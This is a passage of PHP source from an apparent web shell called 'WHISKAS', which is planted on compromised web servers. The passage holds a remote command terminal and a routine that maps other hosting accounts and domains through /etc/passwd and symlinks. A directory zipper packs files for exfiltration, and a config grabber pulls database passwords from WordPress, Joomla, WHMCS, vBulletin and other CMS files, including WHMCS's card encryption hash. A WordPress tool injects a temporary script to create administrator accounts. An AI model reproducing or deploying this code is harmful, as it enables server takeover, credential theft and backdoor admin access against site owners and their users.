			$cwd = str_replace("{user}", trim($solevisible[1]), $makepwd);
			echo str_replace(array("{count}","{user}","{url}","{cwd}"), array($count++, trim($solevisible[1]), trim($solevisible[0]), $cwd), $template);
		}
	}
}else{
	$passwd = _WHISKAS_file("/etc/passwd");
	if($passwd){
		$html = "";
		$is_named = false;
		$users = array();
		$domains = array();
		$uknowns = array();
		foreach($passwd as $user){
			$user = trim($user);
			$expl = explode(":", $user);
			if((int)$expl[2] < 500)continue;
			$users[$expl[0]] = $expl[5];
		}
		$site_domains = @scandir("/etc/virtual/");
		if(!$site_domains){
			$site_domains = WHISKASEx("ls /etc/virtual/");
			$site_domains = explode("\n", $site_domains);
			if(!$site_domains){
				$site_domains = _WHISKAS_file("/etc/named.conf");
				if($site_domains){$is_named = true;}
			}
		}
		foreach($site_domains as $line){
			if($is_named){
				if(@strstr($line, 'zone')){
					preg_match_all('#zone "(.*)"#',$line, $data);
					$domain = $data[1][0];
					if(strlen($domain  > 2) && !empty($domain)){
						$domains[] = $domain;
					}
				}
			}else{
				$domains[] = $line;
			}
		}
		$x = 1;
		foreach($users as $user => $home){
			foreach($domains as $domain){
				$user_len = strlen($user) - 1;
				$sub_domain = str_replace(array("-","."), "", $domain);
				$five_user = substr($user, 0,$user_len);
				$five_domain = substr($sub_domain, 0,$user_len);
				if($five_user == $five_domain){
					if($is_direct){
						$cwd = str_replace("{user}", $user, $makepwd);
					}else{
						$expl = explode("}/", $makepwd);
						$cwd = $home."/".$expl[1];
					}
					$html .= str_replace(array("{count}","{user}","{url}", "{cwd}"), array($x++, $user, $domain, $cwd), $template);
				}else{
					$uknowns[$user] = $home;
				}
			}
		}
		$uknowns = array_unique($uknowns);
		foreach($uknowns as $user => $home){
			if($is_direct){
				$cwd = str_replace("{user}", $user, $makepwd);
			}else{
				$expl = explode("}/", $makepwd);
				$cwd = $home."/".$expl[1];
			}
			$html .= str_replace(array("{count}","{user}","{url}", "{cwd}"), array($x++, $user, "[?????]", $cwd), $template);
		}echo($html);
	}
}
echo "</table>";
$cant_symlink = false;
}
}else{
	echo "<pre class=ml1 style='margin-top:5px'><b><font color=\"#FFFFFF\">[+] Symlink Function Disabled !</b></font></pre></center>";
	$cant_symlink = false;
}
if($cant_symlink)echo '<pre id="strOutput" style="margin-top:5px" class="ml1"><br><font color="#000000">Error...</font></b><br>';
echo "</center></table>";
}
echo "</div>";
WHISKASfooter();
}
function WHISKASziper(){
WHISKAShead();
WHISKASNum(8,9,10);
echo '<div class=header><p><center><p><div class="txtfont_header">| Compressor |</div></p>
<form onSubmit="g(\'ziper\',null,null,null,this.dirzip.value,this.zipfile.value,\'>>\');return false;" method="post">
<div class="txtfont">Dir/File: </div> <input type="text" name="dirzip" value="'.(!empty($_POST['WHISKAS3'])?htmlspecialchars($_POST['WHISKAS3']):htmlspecialchars($GLOBALS['cwd'])).'" size="60"/>
<div class="txtfont">Save Dir: </div> <input type="text" name="zipfile" value="'.$GLOBALS['cwd'].'whiskas.zip" size="60"/>
<input type="submit" value=" " name="ziper" />
</form></center></p>';
if(isset($_POST['WHISKAS5']) && ($_POST['WHISKAS5'] == '>>')){
$dirzip = $_POST['WHISKAS3'];
$zipfile = $_POST['WHISKAS4'];
if($GLOBALS['sys']!='unix'&&_WHISKAS_can_runCommand(true,true)){
WHISKASEx("powershell Compress-Archive -Path '".addslashes($dirzip)."' -DestinationPath '".addslashes(basename($zipfile))."'");
echo __pre().'<center><p>Done -> <b><font color="red">'.$zipfile.'</font></b></p></center>';
}elseif($GLOBALS['sys']=='unix'&&_WHISKAS_can_runCommand(true,true)){
WHISKASEx("cd '".addslashes(dirname($zipfile))."';zip -r '".addslashes(basename($zipfile))."' '".addslashes($dirzip)."'");
echo __pre().'<center><p>Done -> <b><font color="red">'.$zipfile.'</font></b></p></center>';
}elseif(class_exists('ZipArchive')){
if(__WHISKASziper($dirzip, $zipfile)){
echo __pre().'<center><p><font color="red">Success...!<br>'.$zipfile.'</font></p></center>';
}else{echo __pre().'<center><p><font color="red">ERROR!!!...</font></p></center>';}
}
}
echo '</div>';
WHISKASfooter();
}
function __WHISKASziper($source,$destination){
	if(!extension_loaded('zip')||!file_exists($source)){
		return false;
	}
	$zip=new ZipArchive();
	if(!$zip->open($destination,ZIPARCHIVE::CREATE)){
		return false;
	}
	$source=str_replace('\\','/',realpath($source));
	if(is_dir($source)===true){
		$files=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source),RecursiveIteratorIterator::SELF_FIRST);
		foreach($files as $file){
			$file=str_replace('\\','/',$file);
			if(in_array(substr($file,strrpos($file,'/')+1),array('.','..')))continue;
			$file=realpath($file);
			if(is_dir($file)===true){
				$zip->addEmptyDir(str_replace($source.'/','',$file.'/'));
			}else if(is_file($file)===true){
				$zip->addFromString(str_replace($source.'/','',$file),file_get_contents($file));
			}
		}
	}else if(is_file($source)===true){
		$zip->addFromString(basename($source),file_get_contents($source));
	}
	return $zip->close();
}
function WHISKASGetDisFunc(){
WHISKAShead();
echo '<div class="header">';
$disfun = @ini_get('disable_functions');
$s = explode(',',$disfun);
$f = array_unique($s);
echo '<center><br><b><font color="#7CFC00">Disable Functions</font></b><pre><table border="1"><tr><td align="center" style="background-color: red;color: white;width:5%">#</td><td align="center" style="background-color: red;color: white;">Func Name</td></tr>';
$i=1;
foreach($f as $s){
$s=trim($s);
if(function_exists($s)||!is_callable($s))continue;
echo '<tr><td align="center" style="background-color: black;">'.$i.'</td>';
echo '<td align="center" style="background-color: black;"><a style="text-decoration: none;" target="_blank" href="http://php.net/manual/en/function.'.str_replace('_','-',$s).'.php"><span class="disable_functions"><b>'.$s.'</b></span></a></td>';
$i++;
}
echo '</table></center>';
echo '</div>';
WHISKASfooter();
}
function WHISKAS_Create_A_Tag($action,$vals){
$nulls = array();
foreach($vals as $key => $val){
echo '<a href=javascript:void(0) onclick="g(\''.$action.'\',';
for($i=1;$i<=$val[1]-1;$i++)$nulls[] = 'null';
$f = implode(',',$nulls);
echo $f.',\''.$val[0].'\');return false;">| '.$key.' | </a>';
unset($nulls);
}
}
function WHISKASiFrameCreator($f,$width='100%',$height='600px'){
return('<iframe src="'.__WHISKAS_DATA_FOLDER__."/".$f.'" width="'.$width.'" height="'.$height.'" frameborder="0"></iframe>');
}
class WHISKASCURL {
public $headers;
public $user_agent;
public $compression;
public $cookie_file;
public $proxy;
public $path;
public $ssl = true;
public $curl_status = true;
function __construct($cookies=false,$compression='gzip',$proxy=''){
if(!extension_loaded('curl')){$curl_status = false;return false;}
$this->headers[] = 'Accept: image/gif, image/x-bitmap, image/jpeg, image/pjpeg';
$this->headers[] = 'Connection: Keep-Alive';
$this->headers[] = 'Content-type: application/x-www-form-urlencoded;charset=UTF-8';
$this->user_agent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36)';
$this->path = WHISKAS_TEMPDIR.'/WHISKAS_cookies.txt';
$this->compression=$compression;
$this->proxy=$proxy;
$this->cookies=$cookies;
if($this->cookies)$this->cookie($this->path);
}
function cookie($cookie_file) {
if (_WHISKAS_file_exists($cookie_file,false)) {
$this->cookie_file=$cookie_file;
}else{
@fopen($cookie_file,'w') or die($this->error('The cookie file could not be opened.'));
$this->cookie_file=$cookie_file;
@fclose($this->cookie_file);
}
}
function Send($url,$method="get",$data=""){
if(!$this->curl_status){return false;}
$process = curl_init($url);
curl_setopt($process, CURLOPT_HTTPHEADER, $this->headers);
curl_setopt($process, CURLOPT_HEADER, 0);curl_setopt($process, CURLOPT_USERAGENT, $this->user_agent);
curl_setopt($process, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($process, CURLOPT_ENCODING , $this->compression);
curl_setopt($process, CURLOPT_TIMEOUT, 30);
if($this->ssl){
curl_setopt($process, CURLOPT_SSL_VERIFYPEER ,false);
curl_setopt($process, CURLOPT_SSL_VERIFYHOST,false);
}
if($this->cookies){
curl_setopt($process, CURLOPT_COOKIEFILE, $this->path);
curl_setopt($process, CURLOPT_COOKIEJAR, $this->path);
}
if($this->proxy){
curl_setopt($process, CURLOPT_PROXY, $this->proxy);
}
if($method=='post'){
curl_setopt($process, CURLOPT_POSTFIELDS, $data);
curl_setopt($process, CURLOPT_POST, 1);
curl_setopt($process, CURLOPT_HTTPHEADER, array('Content-Type: application/x-www-form-urlencoded'));
}
$return= @curl_exec($process);
curl_close($process);
return $return;
}
function error($error) {
echo "<center><div style='width:500px;border: 3px solid #FFEEFF; padding: 3px; background-color: #FFDDFF;font-family: verdana; font-size: 10px'><b>cURL Error</b><br>$error</div></center>";
die;
}
}
function getConfigHtml($cms){
$content = '';
$cms_array = array("wp" => "WordPress", "vb" => "vBulletin", "whmcs" => "Whmcs", "joomla" => "Joomla", "phpnuke" => "PHPNuke","phpbb"=>"PHPBB","mybb"=>"MyBB","drupal"=>"Drupal","smf"=>"SMF");
$content .= "<form class='getconfig' onSubmit='g(\"GetConfig\",null,this.cms.value,this.path.value,this.getAttribute(\"base_id\"));return false;'><div class='txtfont'>Cms: </div> <select name='cms'style='width:100px;'>";
foreach($cms_array as $key => $val){
$content .= "<option value='{$key}' ".($key==$cms?'selected=selected':'').">{$val}</option>";
}
$content .= "</select> <div class='txtfont'>Path(installed cms/Config): </div> <input type='text' name='path' value='".$_SERVER['DOCUMENT_ROOT']."/' size='30' /> <button class='button'>GetConfig</button>";
$content .= "</form>";
return $content;
}
if (!function_exists('json_encode')){
    function json_encode($a=false){
        if (is_null($a)) return 'null';
        if ($a === false) return 'false';
        if ($a === true) return 'true';
        if (is_scalar($a))
        {
            if (is_float($a))
            {
                return floatval(str_replace(",", ".", strval($a)));
            }

            if (is_string($a))
            {
                static $jsonReplaces = array(array("\\", "/", "\n", "\t", "\r", "\b", "\f", '"'), array('\\\\', '\\/', '\\n', '\\t', '\\r', '\\b', '\\f', '\"'));
                return '"' . str_replace($jsonReplaces[0], $jsonReplaces[1], $a) . '"';
            }
            else
            return $a;
        }
        $isList = true;
        for ($i = 0, reset($a); $i < count($a); $i++, next($a))
        {
            if (key($a) !== $i)
            {
                $isList = false;
                break;
            }
        }
        $result = array();
        if ($isList)
        {
            foreach ($a as $v) $result[] = json_encode($v);
            return '[' . join(',', $result) . ']';
        }
        else
        {
            foreach ($a as $k => $v) $result[] = json_encode($k).':'.json_encode($v);
            return '{' . join(',', $result) . '}';
        }
    }
}
if ( !function_exists('json_decode') ){
function json_decode($json, $array=true){
    $comment = false;
    $out = '$x=';
    for ($i=0; $i<strlen($json); $i++)
    {
        if (!$comment)
        {
            if ($json[$i] == '{' || $json[$i] == '['){$out .= ' array(';}
            else if ($json[$i] == '}' || $json[$i] == ']'){$out .= ')';}
            else if ($json[$i] == ':'){$out .= '=>';}
            else {$out .= $json[$i];}
        }
        else $out .= $json[$i];
        if ($json[$i] == '"')    $comment = !$comment;
    }
    eval($out . ';');
    return $x;
}
}
function WHISKASterminalExec(){
	$pwd = "pwd";
	$seperator = ";";
	if($GLOBALS['sys']!='unix'){$pwd = "cd";
		$seperator = "&";
	}
	$cmd = '';
	if($GLOBALS["glob_chdir_false"]&&!empty($_POST["c"])){$cmd = "cd '".addslashes($_POST["c"])."'".$seperator;}
	$current_path = '';
	if(preg_match("/cd[ ]{0,}(.*)[ ]{0,}".$seperator."|cd[ ]{0,}(.*)[ ]{0,}/i", $_POST['WHISKAS1'], $match)){
		if(empty($match[1])){
			$match[1] = $match[2];
		}
		$current_path = WHISKASEx("cd ".addslashes($match[1]).$seperator.$pwd);
		$current_path = str_replace("\\", "/", $current_path);
	}
	$out = WHISKASEx($cmd.$_POST['WHISKAS1'], true);
	$out = htmlspecialchars($out);
	echo json_encode(array("output" => convertBash($out), "path" => $current_path));
}
function convertBash($code) {
    $dictionary = array(
        '[01;30m' => '<span style="color:black;font-weight:bold">',
        '[01;31m' => '<span style="color:red">',
        '[01;32m' => '<span style="color:red">',
        '[01;33m' => '<span style="color:yellow">',
        '[01;34m' => '<span style="color:blue">',
        '[01;35m' => '<span style="color:purple">',
        '[01;36m' => '<span style="color:cyan">',
        '[01;37m' => '<span style="color:white">',
        '[0m'   => '</span>'
    );
    $htmlString = str_replace(array_keys($dictionary), $dictionary, $code);
    return $htmlString;
}
function WHISKASdoActions(){
	$chdir_fals = false;
	if(!@chdir($_POST['c'])){
		$chdir_fals = true;
		$WHISKAS_canruncmd = _WHISKAS_can_runCommand(true,true);
	}
	if(isset($_POST['WHISKAS1']))$_POST['WHISKAS1'] = rawurldecode($_POST['WHISKAS1']);
	if(isset($_POST['WHISKAS2']))$_POST['WHISKAS2'] = rawurldecode($_POST['WHISKAS2']);
	$action = $_POST["WHISKAS3"];
	if($action == "permission"){
		$perms = 0;
		$perm = $_POST["WHISKAS2"];
		for($i=strlen($perm)-1;$i>=0;--$i){
			$perms += (int)$perm[$i]*pow(8, (strlen($perm)-$i-1));
		}
		if(@chmod($_POST['WHISKAS1'], $perms)){
			echo("done");
		}else{
			echo("no");
		}
		return;
	}
	if($action == "rename" || $action == "move"){
		$WHISKAS1_decoded = $_POST['WHISKAS1'];
		if($chdir_fals){
			$_POST['WHISKAS1'] = $_POST["c"]."/".$_POST["WHISKAS1"];
		}
		$_POST['WHISKAS1'] = trim($_POST['WHISKAS1']);
		$WHISKAS1_escape = addslashes($_POST["WHISKAS1"]);
		if($_POST["WHISKAS3"] == "rename"){
			$_POST['WHISKAS2'] = basename($_POST['WHISKAS2']);
		}
		if(!empty($_POST['WHISKAS2'])){
			$cmd_rename = false;
			if($chdir_fals&&$WHISKAS_canruncmd){
				if(_WHISKAS_is_writable($_POST['WHISKAS1'])){
					$cmd_rename = true;
					$WHISKAS1_escape = addslashes($WHISKAS1_decoded);
					WHISKASEx("cd '".addslashes($_POST['c'])."';mv '".$WHISKAS1_escape."' '".addslashes($_POST['WHISKAS2'])."'");
				}
			}
			if(!file_exists($_POST['WHISKAS2'])){
				if(@rename($_POST['WHISKAS1'], $_POST['WHISKAS2'])||$cmd_rename){
					echo "done";
				}else{
					echo "no";
				}
			}else{
				echo "no";
			}
		}
	}elseif($action == "copy"){
		if(is_dir($_POST["WHISKAS1"])){
			$dir = str_replace('//', '/', $_POST["WHISKAS1"]);
			$dir = explode('/', $dir);
			if(empty($dir[count($dir) - 1])){
				$name = $dir[count($dir) - 2];
			}else{
				$name = $dir[count($dir) - 1];
			}
		}else{
			$name = basename($_POST["WHISKAS1"]);
		}
		$dir = dirname($_POST["WHISKAS1"]);
		if($dir == "."){
			$dir = $_POST["c"]."/";
		}
		if(is_file($_POST["WHISKAS1"])){
			@copy($_POST["WHISKAS1"], $_POST["WHISKAS2"]);
			echo("done");
		}elseif(is_dir($_POST["WHISKAS1"])){
			if(!is_dir($_POST["WHISKAS2"])){
				mkdir($_POST["WHISKAS2"], 0755, true);
			}
			copy_paste($dir, $name , $_POST["WHISKAS2"] . "/");
			echo("done");
		}
	}elseif($action == "modify"){
		if( !empty($_POST['WHISKAS1']) ) {
			$time = strtotime($_POST['WHISKAS1']);
			if($time){
				$touched = false;
				if($chdir_fals&&$WHISKAS_canruncmd){
					WHISKASEx("cd '".addslashes($_POST["c"])."';touch -d '".htmlspecialchars(addslashes($_POST['WHISKAS1']))."' '".addslashes($_POST['WHISKAS2'])."'");
					$touched = true;
				}
				if(!@touch($_POST['WHISKAS2'],$time,$time)&&!$touched){
					echo 'no';
				}else{
					echo 'ok';
				}
			} else{
				 echo 'badtime';
			}
		}
	}

}
function WHISKASget_flags(){
	$flags = array();
	if(function_exists("curl_version")){
		$curl = new WHISKASCURL();
		$server_addr = (!@$_SERVER["SERVER_ADDR"]?(function_exists("gethostbyname")?@gethostbyname($_SERVER['SERVER_NAME']):'????'):@$_SERVER["SERVER_ADDR"]);
		$flag = $curl->Send("http://www.geoplugin.net/json.gp?ip=" . $server_addr);
		$flag2 = $curl->Send("http://www.geoplugin.net/json.gp?ip=" . $_SERVER["REMOTE_ADDR"]);
		if(strpos($flag2, "geoplugin") != false){
			$flag = json_decode($flag, true);
			$flag2 = json_decode($flag2, true);
			if(!empty($flag['geoplugin_countryCode'])){
				$flags["server"]["name"] = $flag['geoplugin_countryName'];
				$flags["server"]["code"] = $flag['geoplugin_countryCode'];
			}
			if(!empty($flag2['geoplugin_countryCode'])){
				$flags["client"]["name"] = $flag2['geoplugin_countryName'];
				$flags["client"]["code"] = $flag2['geoplugin_countryCode'];
			}
		}
	}
	echo json_encode($flags);
}
function WHISKASGetConfig(){
$cms = $_POST['WHISKAS1'];
$path = trim($_POST['WHISKAS2']);
$config = array(
'wp'=>array('file'=>'/wp-config.php',
'host'=>array("/define[ ]{0,}\([ ]{0,}(?:'|\")DB_HOST(?:'|\")[ ]{0,},[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,}\)[ ]{0,};/",1),
'dbname'=>array("/define[ ]{0,}\([ ]{0,}(?:'|\")DB_NAME(?:'|\")[ ]{0,},[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,}\)[ ]{0,};/",1),
'dbuser'=>array("/define[ ]{0,}\([ ]{0,}(?:'|\")DB_USER(?:'|\")[ ]{0,},[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,}\)[ ]{0,};/",1),
'dbpw'=>array("/define[ ]{0,}\([ ]{0,}(?:'|\")DB_PASSWORD(?:'|\")[ ]{0,},[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,}\)[ ]{0,};/",1),
'prefix'=>array("/table_prefix[ ]{0,}=[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,};/",1)
),
'drupal'=>array('file'=>'/config.php',
'host'=>array("/define[ ]{0,}\([ ]{0,}(?:'|\")DB_HOSTNAME(?:'|\")[ ]{0,},[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,}\)[ ]{0,};/",1),
'dbname'=>array("/define[ ]{0,}\([ ]{0,}(?:'|\")DB_DATABASE(?:'|\")[ ]{0,},[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,}\)[ ]{0,};/",1),
'dbuser'=>array("/define[ ]{0,}\([ ]{0,}(?:'|\")DB_USERNAME(?:'|\")[ ]{0,},[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,}\)[ ]{0,};/",1),
'dbpw'=>array("/define[ ]{0,}\([ ]{0,}(?:'|\")DB_PASSWORD(?:'|\")[ ]{0,},[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,}\)[ ]{0,};/",1),
'prefix'=>array("/define[ ]{0,}\([ ]{0,}(?:'|\")DB_PREFIX(?:'|\")[ ]{0,},[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,}\)[ ]{0,};/",1)
),
'drupal2'=>array('file'=>'/sites/default/settings.php',
'host'=>array("/(?:'|\")host(?:'|\")[ ]{0,}=>[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,},/",1),
'dbname'=>array("/(?:'|\")database(?:'|\")[ ]{0,}=>[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,},/",1),
'dbuser'=>array("/(?:'|\")username(?:'|\")[ ]{0,}=>[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,},/",1),
'dbpw'=>array("/(?:'|\")password(?:'|\")[ ]{0,}=>[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,},/",1),
'prefix'=>array("/(?:'|\")prefix(?:'|\")[ ]{0,}=>[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,},/",1)
),
'vb'=>array('file'=>'/includes/config.php',
'host'=>array("/config\[(?:'|\")MasterServer(?:'|\")\]\[(?:'|\")servername(?:'|\")\](\s+)=(\s+)(?:'|\")(.*?)(?:'|\")[ ]{0,};/",3),
'dbuser'=>array("/config\[(?:'|\")MasterServer(?:'|\")\]\[(?:'|\")username(?:'|\")\](\s+)=(\s+)(?:'|\")(.*?)(?:'|\")[ ]{0,};/",3),
'dbname'=>array("/config\[(?:'|\")Database(?:'|\")\]\[(?:'|\")dbname(?:'|\")\](\s+)=(\s+)(?:'|\")(.*?)(?:'|\")[ ]{0,};/",3),
'dbpw'=>array("/config\[(?:'|\")MasterServer(?:'|\")\]\[(?:'|\")password(?:'|\")\](\s+)=(\s+)(?:'|\")(.*?)(?:'|\")[ ]{0,};/",3),
'prefix'=>array("/config\[(?:'|\")Database(?:'|\")\]\[(?:'|\")tableprefix(?:'|\")\](\s+)=(\s+)(?:'|\")(.*?)(?:'|\")[ ]{0,};/",3)
),
'phpnuke'=>array('file'=>'/config.php',
'host'=>array('/dbhost(\s+)=(\s+)(?:\'|")(.*?)(?:\'|");/',3),
'dbname'=>array('/dbname(\s+)=(\s+)(?:\'|")(.*?)(?:\'|");/',3),
'dbuser'=>array('/dbuname(\s+)=(\s+)(?:\'|")(.*?)(?:\'|");/',3),
'dbpw'=>array('/dbpass(\s+)=(\s+)(?:\'|")(.*?)(?:\'|");/',3),
'prefix'=>array('/prefix(\s+)=(\s+)(?:\'|")(.*?)(?:\'|");/',3)
),
'smf'=>array('file'=>'/Settings.php',
'host'=>array("/db_server(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
'dbname'=>array("/db_name(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
'dbuser'=>array("/db_user(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
'dbpw'=>array("/db_passwd(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
'prefix'=>array("/db_prefix(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3)
),
'whmcs'=>array('file'=>'/configuration.php',
'host'=>array("/db_host(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
'dbname'=>array("/db_name(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
'dbuser'=>array("/db_username(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
'dbpw'=>array("/db_password(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
'cc_encryption_hash'=>array("/cc_encryption_hash(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3)
),
'joomla'=>array('file'=>'/configuration.php',
'host'=>array("/\\\$host(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
'dbname'=>array("/\\\$db(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
'dbuser'=>array("/\\\$user(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
'dbpw'=>array("/\\\$password(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
'prefix'=>array("/\\\$dbprefix(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3)
),
'phpbb'=>array('file'=>'/config.php',
'host'=>array("/dbhost(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
'dbname'=>array("/dbname(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
'dbuser'=>array("/dbuser(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
'dbpw'=>array("/dbpasswd(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
'prefix'=>array("/table_prefix(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3)
),
'mybb'=>array('file'=>'/inc/config.php',
'host'=>array("/config\['database'\]\['hostname'\](\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
'dbname'=>array("/config\['database'\]\['database'\](\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
'dbuser'=>array("/config\['database'\]\['username'\](\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
'dbpw'=>array("/config\['database'\]\['password'\](\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
'prefix'=>array("/config\['database'\]\['table_prefix'\](\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3)
)
);
if($cms == "drupal"){
	$file = $config[$cms]['file'];
	$file=$path.$file;
	if(@is_file($file)||_WHISKAS_is_dir($file,"-e")){
	}else{
		$cms = 'drupal2';
	}
}
if($cms == "vb"){
	$file = $config[$cms]['file'];
	$file=$path.$file;
	if(@is_file($file)||_WHISKAS_is_dir($file,"-e")){
	}else{
		$path .= '/core';
	}
}
$data = array();
$srch_host = $config[$cms]['host'][0];
$srch_user = $config[$cms]['dbuser'][0];
$srch_name = $config[$cms]['dbname'][0];
$srch_pw = $config[$cms]['dbpw'][0];
$prefix = $config[$cms]['prefix'][0];
$file = $config[$cms]['file'];
$chost = $config[$cms]['host'][1];
$cuser = $config[$cms]['dbuser'][1];
$cname = $config[$cms]['dbname'][1];
$cpw = $config[$cms]['dbpw'][1];
$cprefix = $config[$cms]['prefix'][1];
if(@is_dir($path)||_WHISKAS_is_dir($path)){
$file=$path.$file;
}elseif(@is_file($path)||_WHISKAS_is_dir($path,"-e")){
$file=$path;
}else{
return false;
}
$file = __read_file($file);
if($cms == "drupal2"){
	$file = preg_replace("/\@code(.*?)\@endcode/s", "", $file);
}elseif($cms == "vb"){
	$file = preg_replace("/right of the(.*?)BAD!/s", "", $file);
}
if(preg_match($srch_host, $file, $mach)){
$data['host'] = $mach[$chost];
}
if(preg_match($srch_user, $file, $mach)){
$data['user'] = $mach[$cuser];
}
if(preg_match($srch_name, $file, $mach)){
$data['dbname'] = $mach[$cname];
}
if(preg_match($srch_pw, $file, $mach)){
$data['password'] = $mach[$cpw];
}
if(isset($prefix)){
if(preg_match($prefix, $file, $mach)){
$data['prefix'] = $mach[$cprefix];
}
}
if($cms=='whmcs'){
if(preg_match($config[$cms]['cc_encryption_hash'][0], $file, $mach)){
$data['cc_encryption_hash'] = $mach[3];
}
}
echo json_encode($data);
}

// ============ HELPER FUNCTIONS FOR NEW FEATURES ============
function get_base_url_helper() {
    $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https://' : 'http://';
    return $protocol . ($_SERVER['HTTP_HOST'] ?? '');
}

function get_web_url_from_path_helper($local_path) {
    if (empty($local_path)) return 'N/A';
    $resolved = @realpath($local_path);
    if (!$resolved) return 'N/A';
    $doc_root = @realpath($_SERVER['DOCUMENT_ROOT'] ?? '');
    if (!empty($doc_root) && strpos($resolved, $doc_root) === 0) {
        $rel = str_replace($doc_root, '', $resolved);
        $rel = ltrim($rel, DIRECTORY_SEPARATOR);
        return get_base_url_helper() . '/' . str_replace('\\', '/', $rel);
    }
    return 'N/A';
}

function generate_random_filename_helper() {
    $chars = 'abcdefghijklmnopqrstuvwxyz';
    $str = '';
    for ($i = 0; $i < 12; $i++) $str .= $chars[mt_rand(0, 25)];
    $prefixes = ['cache_', 'temp_', 'config_', 'session_', 'data_'];
    return $prefixes[array_rand($prefixes)] . $str . '.php';
}

// ============ WORDPRESS USER MANAGER ============
function WHISKASwp_adduser() {
    WHISKAShead();
    echo'<div class="header"><center><p><div class="txtfont_header">| WordPress User Manager |</div></p></center>';

    $detected_paths = [];
    $search_paths = [$_SERVER['DOCUMENT_ROOT'] ?? '', dirname($_SERVER['DOCUMENT_ROOT'] ?? ''), '/home/' . @get_current_user() . '/public_html'];
    foreach ($search_paths as $base) {
        if (@file_exists($base . '/wp-config.php')) $detected_paths[] = $base;
        $dirs = @scandir($base);
        if ($dirs) foreach ($dirs as $dir) {
            if ($dir === '.' || $dir === '..') continue;
            $check = $base . '/' . $dir;
            if (@is_dir($check) && @file_exists($check . '/wp-config.php')) $detected_paths[] = $check;
        }
    }
    $detected_paths = array_unique($detected_paths);
    $default_wp = !empty($detected_paths) ? $detected_paths[0] : ($_SERVER['DOCUMENT_ROOT'] ?? '');

    $wp_message = '';

    // Execute WP Script function
    $executeWpScript = function($wp_path, $script_code) {
        $wp_path = rtrim($wp_path, '/');
        if (!@is_dir($wp_path) || !@file_exists($wp_path . '/wp-config.php')) return "ERROR:Path tidak valid";
        $script_path = $wp_path . '/.wp-tmp-' . substr(md5(time() . rand()), 0, 8) . '.php';
        $full = '<?php @error_reporting(0); define("WP_USE_THEMES", false); define("ABSPATH", dirname(__FILE__) . "/");
try { if (file_exists("wp-load.php")) require("wp-load.php"); else { echo "ERROR:WP not found"; @unlink(__FILE__); exit; }} catch (Exception $e) { echo "ERROR:" . $e->getMessage(); @unlink(__FILE__); exit; }
' . $script_code . ' @unlink(__FILE__); ?>';
        if (@file_put_contents($script_path, $full) === false) return "ERROR:Cannot write";
        $old = getcwd(); @chdir($wp_path); ob_start(); @include($script_path); $result = ob_get_clean(); @chdir($old);
        if (@file_exists($script_path)) @unlink($script_path);
        return empty(trim($result)) ? "ERROR:WP tidak respond" : $result;
    };

    if (isset($_POST['WHISKAS1']) && $_POST['WHISKAS1'] == 'create') {
        $wp_path = $_POST['WHISKAS2'] ?? '';
        $username = $_POST['WHISKAS3'] ?? '';
        $password = $_POST['WHISKAS4'] ?? '';
        $email = $_POST['WHISKAS5'] ?? '';
        $role = $_POST['WHISKAS6'] ?? 'administrator';

        if (!empty($wp_path) && !empty($username) && !empty($password) && filter_var($email, FILTER_VALIDATE_EMAIL)) {
            $result = $executeWpScript($wp_path, '$u="'.addslashes($username).'";$p="'.addslashes($password).'";$e="'.addslashes($email).'";$r="'.addslashes($role).'"; if(!username_exists($u)&&!email_exists($e)){$id=wp_create_user($u,$p,$e);if(!is_wp_error($id)){$wu=new WP_User($id);$wu->set_role($r);echo "SUCCESS";}else{echo "ERROR:".$id->get_error_message();}}else{echo "EXISTS";}');
            if (trim($result) === "SUCCESS") $wp_message = "<div style='color:#0f0;padding:10px;background:#1a3a1a;border-radius:4px;margin:10px 0;'>User <b>$username</b> berhasil dibuat! Password: <code>$password</code></div>";
